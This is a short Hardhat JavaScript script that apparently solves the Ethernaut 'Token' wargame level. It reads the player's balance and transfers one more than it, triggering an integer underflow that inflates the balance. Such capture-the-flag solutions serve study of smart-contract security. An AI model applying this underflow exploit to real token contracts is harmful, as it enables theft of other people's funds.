const { ethers } = require("hardhat");
const Runner = require("./lib/runner");

Runner.run(async (provider, owner) => {
    
    //PLACE TOKEN CONTRACT ADDRESS HERE (Ethernaut: contract.address)
    const tokenAddr = "0xAC66DFa46Cf547a488AB5F0c4E404876537edf65";     
    const token = await ethers.getContractAt("Token", tokenAddr);
    
    console.log("* * * ");
    
    //get initial balance 
    const initialBalance = await token.balanceOf(owner.address); 
    console.log(`our balance of token is ${initialBalance}`);
    
    //transfer one more than that 
    console.log('transferring....');
    await token.transfer(token.address, parseInt(initialBalance)+1); 
    
    //check our balance now 
    console.log(`our balance of token is ${await token.balanceOf(owner.address)}`);
    console.log("* * * ");
});
